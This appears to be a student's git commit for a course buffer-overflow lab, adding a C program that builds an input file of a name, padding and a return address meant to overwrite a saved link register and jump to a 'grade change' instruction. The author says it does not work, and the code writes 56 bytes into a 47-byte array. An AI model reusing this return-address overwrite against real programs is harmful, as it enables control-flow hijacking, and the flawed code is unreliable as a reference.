2af0dd357b714dc8b2e3b6466a237fd29506ed5c
Jade Sceats <jadesceats@gmail.com>
2025-12-08 18:13:11 -0500

    attempt at part 3 (it doesnt work though ashdkjfha)

---
+++ createdataB.c
@@ -0,0 +1,41 @@
+/*
+Produces a file called dataB with the student name, a nullbyte, padding
+to overrun the stack, and the address of the instruction in main to get
+a B, the latter of which will overwrite getName's stored x30
+*/
+
+#include <stdio.h>
+
+int main(void) {
+    char pcName[47];
+    char ch = 0;
+    int i = 0;
+    unsigned long uiTargetAddr = 0x400890;
+    FILE *psFile;
+
+    /* get name(s) to use in dataB */
+    /* max 55 chars since there are 48 bytes for buf + 2 * 8 for ints
+    and need to reserve one byte for nullbyte */
+    printf("Enter your name(s) (max 55 chars):\n");
+    while ((i < 55) && (ch != '\n')) {
+        ch = getchar();
+        pcName[i] = ch;
+        i++;
+    }
+    /* add nullbyte */
+    pcName[i++] = '\0';
+    /* pad as necessary */
+    for (; i < 56; i++) {
+        pcName[i] = '0';
+    }
+
+    psFile = fopen("dataB", "w");
+    /* fill buf */
+    fwrite(pcName, sizeof(char), 56, psFile);
+    /* overwrite getName's x30 with addr of grade change instruction
+    (0x400890) */
+    fwrite(&uiTargetAddr, sizeof(unsigned long), 1, psFile);
+    fclose(psFile);
+
+    return 0;
+}
